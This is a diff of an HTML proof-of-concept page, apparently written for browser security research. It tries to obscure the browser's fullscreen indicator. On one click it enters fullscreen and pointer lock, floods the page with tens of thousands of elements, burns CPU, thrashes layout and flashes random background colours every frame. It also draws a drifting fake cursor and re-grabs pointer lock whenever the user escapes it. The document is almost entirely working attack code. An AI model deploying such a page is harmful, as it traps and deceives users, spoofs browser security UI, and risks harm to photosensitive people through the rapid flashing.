@@ -2,84 +2,194 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Fullscreen Dropdown PoC (Improved)</title>
+<title>ULTRA UX PRESSURE PoC</title>
 <style>
-  body { margin:0; padding:0; overflow:hidden; font-family: Arial, sans-serif; }
+  body { margin:0; overflow:hidden; font-family:Arial; }
 
-  #testSelect {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    font-size: 2.5em;
-    z-index: 999999;
+  #start {
+    position:fixed; inset:0;
+    display:flex; align-items:center; justify-content:center;
+    background:#111; color:#fff; font-size:2em;
+    z-index:1000002; cursor:pointer;
   }
 
-  #overlayText {
-    position: fixed;
-    top: 10px;
-    left: 10px;
-    font-size: 1.5em;
-    color: red;
-    background: rgba(255,255,255,0.7);
-    padding: 5px 10px;
-    z-index: 1000000;
+  #overlay {
+    position:fixed; inset:0;
+    background:#000; color:#fff;
+    display:none; z-index:999999;
   }
 
-  button {
-    position: fixed;
-    bottom: 20px;
-    left: 20px;
-    font-size: 1.2em;
-    padding: 10px 20px;
-    z-index: 1000001;
+  #note {
+    position:fixed; top:10px; left:10px;
+    background:#fff; color:red;
+    padding:6px 10px; z-index:1000000;
+  }
+
+  #list {
+    position:absolute;
+    top:0; left:0;
+    width:100vw; height:100vh;
+    overflow:auto;
+    font-size:1.2em;
+  }
+
+  #toast {
+    position:fixed;
+    bottom:20px; left:50%;
+    transform:translateX(-50%);
+    background:orange; color:black;
+    padding:10px;
+    opacity:0;
+    z-index:1000001;
+  }
+
+  html:fullscreen { cursor:none; }
+
+  #cursorSim {
+    position:absolute;
+    width:12px; height:12px;
+    background:red;
+    border-radius:50%;
+    z-index:1000003;
+    pointer-events:none;
   }
 </style>
 </head>
+
 <body>
 
-<div id="overlayText">Observe fullscreen toast overlap</div>
-<button onclick="startPoC()">Enter Fullscreen</button>
-<select id="testSelect"></select>
+<div id="start">CLICK TO START</div>
+
+<div id="overlay">
+  <div id="note">Observe fullscreen indicator visibility</div>
+  <div id="list"></div>
+</div>
+
+<div id="toast">UI delay active</div>
+<div id="cursorSim"></div>
 
 <script>
-function startPoC() {
-  const select = document.getElementById("testSelect");
+const start = document.getElementById("start");
+const overlay = document.getElementById("overlay");
+const list = document.getElementById("list");
+const toast = document.getElementById("toast");
+const cursor = document.getElementById("cursorSim");
 
-  // Step 1: isi awal (langsung terlihat)
-  for (let i = 0; i < 1000; i++) {
-    let opt = document.createElement("option");
-    opt.textContent = "Option " + i;
-    select.appendChild(opt);
-  }
+let x = innerWidth/2;
+let y = innerHeight/2;
 
-  // Step 2: masuk fullscreen di timing frame
-  requestAnimationFrame(() => {
-    document.documentElement.requestFullscreen();
+start.onclick = () => {
+  start.remove();
 
-    // Step 3: buka dropdown segera setelah fullscreen
-    setTimeout(() => {
-      select.focus();
-      select.size = 25;
-    }, 30);
+  // fullscreen + pointer lock
+  document.documentElement.requestFullscreen();
+  document.documentElement.requestPointerLock();
 
-    // Step 4: tambah option bertahap (lebih stabil dari loop besar)
-    let i = 1000;
-    function addMore() {
-      for (let j = 0; j < 500; j++) {
-        let opt = document.createElement("option");
-        opt.textContent = "Option " + i++;
-        select.appendChild(opt);
-      }
+  overlay.style.display = "block";
 
-      if (i < 20000) {
-        requestAnimationFrame(addMore);
-      }
-    }
-    addMore();
-  });
+  startAll();
+};
+
+// ===== MAIN CHAOS ENGINE =====
+function startAll(){
+  domFlood();
+  cpuBurn();
+  layoutThrash();
+  repaintSpam();
+  cursorDrift();
+  toastRace();
 }
+
+// ===== 1. MASSIVE DOM FLOOD =====
+function domFlood(){
+  let i = 0;
+  function loop(){
+    const frag = document.createDocumentFragment();
+
+    for(let j=0;j<400;j++){
+      const el = document.createElement("div");
+      el.textContent = "ITEM " + (i++);
+      el.style.transform = `scale(${Math.random()+0.5})`;
+      el.style.padding = (Math.random()*4)+"px";
+      frag.appendChild(el);
+    }
+
+    list.appendChild(frag);
+
+    // force reflow
+    list.offsetHeight;
+
+    if(i < 40000) requestAnimationFrame(loop);
+  }
+  loop();
+}
+
+// ===== 2. CPU PRESSURE =====
+function cpuBurn(){
+  let t = 0;
+  function loop(){
+    for(let i=0;i<40000;i++){
+      Math.sqrt(i*i + t);
+    }
+    t++;
+    if(t < 200) requestAnimationFrame(loop);
+  }
+  loop();
+}
+
+// ===== 3. LAYOUT THRASH =====
+function layoutThrash(){
+  let flip = false;
+  function thrash(){
+    document.body.style.margin = flip ? "1px" : "0px";
+    flip = !flip;
+
+    // force style calc
+    getComputedStyle(document.body).margin;
+
+    requestAnimationFrame(thrash);
+  }
+  thrash();
+}
+
+// ===== 4. REPAINT SPAM =====
+function repaintSpam(){
+  function paint(){
+    document.body.style.backgroundColor =
+      `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+
+    requestAnimationFrame(paint);
+  }
+  paint();
+}
+
+// ===== 5. CURSOR DRIFT =====
+function cursorDrift(){
+  function move(){
+    y -= 1.5;
+    if(y < 0) y = 0;
+
+    cursor.style.left = x + "px";
+    cursor.style.top = y + "px";
+
+    requestAnimationFrame(move);
+  }
+  move();
+}
+
+// ===== 6. TOAST TIMING RACE =====
+function toastRace(){
+  setTimeout(()=>{
+    toast.style.opacity = 1;
+  }, 150);
+}
+
+// ===== POINTER LOCK LOOP (legal) =====
+document.addEventListener("pointerlockchange", ()=>{
+  if(document.pointerLockElement !== document.documentElement){
+    document.documentElement.requestPointerLock();
+  }
+});
 </script>
 
 </body>
